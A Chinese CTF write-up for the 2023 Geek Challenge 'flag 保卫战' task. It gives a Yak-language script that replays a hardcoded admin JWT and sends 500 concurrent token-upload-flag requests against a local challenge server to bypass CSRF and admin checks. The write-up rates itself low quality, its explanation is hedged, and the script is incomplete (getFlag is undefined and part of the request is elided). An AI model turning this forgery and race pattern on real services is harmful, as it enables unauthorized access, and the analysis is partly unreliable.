---
title: 极客大挑战 flag 保卫战题目 WP
contest: 极客大挑战
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [Yak-lang, JWT-forge, race-condition, CSRF, parallel-upload, admin-cookie]
attack_chain: 替换 jwt-token 字段为 admin 用户 (HS256 密钥未知但服务端接受)/并发 500 次请求 getToken+postUpload+getFlag 三步走绕 CSRF + admin 鉴权/sync.NewSizedWaitGroup(20) 控制 20 并发
key_payload: jwt-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.47k0jdPsb9JLdi1kgQxF9Gv4tyCoZ1T5nKZiuODYbbg  # 已知 admin 签名 token
one_liner: 极客大挑战 flag 保卫战 Yak 语言 WP，JWT 替换 + 500 并发绕过 CSRF+admin 校验。
lesson: JWT 签名密钥若弱或已知可直接替换 payload 字段伪造身份；CSRF token 配合 admin 鉴权可通过并发请求竞态绕过。
quality: low
---

# 极客大挑战 flag 保卫战题目 WP

## 概览
Yak 语言版本的极客大挑战 flag 保卫战 WP，覆盖 JWT 替换 + 并发竞态绕过。

## 漏洞
- 服务端使用 JWT (HS256) 做身份校验，但 admin 用户的 JWT token 签名密钥已知或签名错误仍被接受
- CSRF token 通过 `GET /new-csrf-token` 获取，绑定到 session cookie
- `/upload` 需要 admin 权限 + yak_csrf token
- `/flag?pass=1111` 是 flag 出口

## 攻击链（Yak 语言实现）
```yak
// 1. 用 admin 的 jwt-token + 拿新 csrf token
getToken = func() {
    raw = `GET /new-csrf-token HTTP/1.1
Host: 127.0.0.1:8089
Cookie: jwt-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.47k0jdPsb9JLdi1kgQxF9Gv4tyCoZ1T5nKZiuODYbbg
`
    rsp, _ = poc.HTTP(raw, poc.https(false))
    cookie = poc.GetHTTPPacketCookie(rsp, "yak_csrf")
    _, body = poc.Split(rsp)
    return cookie, string(body)
}

// 2. POST /upload multipart 1.zip + yak-token
postUpload = func(cookie, token) {
    raw2 = f`POST /upload HTTP/1.1
...
Cookie: jwt-token=...admin...; yak_csrf=${cookie}; ...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIDPlMGmz86uvgyNM
------WebKitFormBoundaryIDPlMGmz86uvgyNM
Content-Disposition: form-data; name="filename"; filename="1.zip"
Content-Type: text/aa
1
------WebKitFormBoundaryIDPlMGmz86uvgyNM
Content-Disposition: form-data; name="yak-token"
${token}
------WebKitFormBoundaryIDPlMGmz86uvgyNM--
`
    _, _ = poc.HTTP(raw2, poc.https(false))
}

// 3. 并发 500 次
synWg = sync.NewSizedWaitGroup(20)
for i = 0; i < 500; i++ {
    synWg.Add()
    go fn {
        defer synWg.Done()
        cookie, token = getToken()
        postUpload(cookie, token)
        getFlag()
    }
}
synWg.Wait()
```

## 攻击原理
- JWT 替换：直接用 admin 用户的 JWT token（已知 payload，签名可绕过）
- 并发竞态：500 次循环内 20 并发执行，期望在某次请求中：
  1. token 还没过期（CSRF 有效期 10s）
  2. 鉴权检查未及时刷新 admin 状态
- 实际可能成功的场景：单次 CSRF token 在多线程下被复用 + admin 权限未及时撤销

## 经验提炼
- Yak 语言是 Yakit 团队的国产安全开发语言，poc.HTTP/poc.GetHTTPPacketCookie/sync.NewSizedWaitGroup 是常用工具
- JWT 替换攻击需要签名密钥弱或服务端校验有缺陷
- 并发竞态常用于绕过"先检查后操作"类鉴权逻辑
- multipart form-data 手工拼接容易出格式问题，建议用 poc.Multipart 工具
